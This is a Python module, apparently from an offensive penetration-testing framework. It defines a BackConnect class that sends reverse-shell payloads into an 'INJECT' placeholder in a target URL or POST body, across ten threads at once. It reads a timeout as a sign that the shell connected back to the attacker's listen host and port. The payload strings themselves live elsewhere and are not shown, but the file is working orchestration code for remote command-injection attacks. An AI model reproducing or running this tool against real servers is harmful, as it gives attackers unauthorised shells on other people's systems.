import lib.framework.framework as framework
import lib.framework.utility.logger as logger
from threading import Lock
from multiprocessing.pool import ThreadPool
from lib.framework.core import PayloadRequest
from requests.exceptions import InvalidURL, ConnectionError, ReadTimeout


class BackConnect:
    thread_lock = Lock()

    def __init__(self, url, listen_hort, listen_port):
        self.url = url
        self.listen_host = listen_hort
        self.listen_port = listen_port
        self.payloads = []
        self.postdata = None

    @staticmethod
    def send_payload(payload_request):
        name = payload_request.payload.name

        BackConnect.output_threadsafe_message(name, f"Sending payload...")

        try:
            payload_request.make()
            BackConnect.output_threadsafe_message(name, "Back connect was not successful.")
        except (ReadTimeout, TimeoutError):
            BackConnect.output_threadsafe_message(name, "Timeout, this should be success?")
        except InvalidURL:
            BackConnect.output_threadsafe_message(name, "The URL you have provided appears to be invalid.")
        except ConnectionError:
            BackConnect.output_threadsafe_message(name, "We failed to connect to the url, is the target online?")
        except Exception as e:
            BackConnect.output_threadsafe_message(name, f"An unexpected error occurred: {type(e).__name__}")

    @staticmethod
    def output_threadsafe_message(name, message):
        with BackConnect.thread_lock:
            logger.custom(name, message)

    def set_payloads(self, payloads):
        if type(payloads) is str:
            self.payloads.append(framework.payloads.available_payloads[payloads])
        else:
            if len(payloads) <= 0:
                payloads = framework.payloads.available_payloads

            for payload in payloads:
                self.payloads.append(framework.payloads.available_payloads[payload])

    def set_postdata(self, postdata):
        self.postdata = postdata

    # Check that there is a place for us to inject commands
    def check_for_inject_placeholder(self):
        if self.url and 'INJECT' in self.url:
            return True

        if self.postdata and 'INJECT' in self.postdata:
            return True

        return False

    def connect(self):
        payload_requests = []

        if not self.check_for_inject_placeholder():
            logger.error("We cannot inject commands as the 'INJECT' placeholder has not been set.")

            if framework.is_interactive:
                logger.error("Type 'help set' to see a list of injectable parameters.")

            return

        for payload in self.payloads:
            request = PayloadRequest(self.url, payload)

            if self.postdata:
                request.set_postdata(self.postdata)

            payload_requests.append(request)

        thread_pool = ThreadPool(10)
        thread_pool.map(self.send_payload, payload_requests)

        thread_pool.close()
        thread_pool.join()
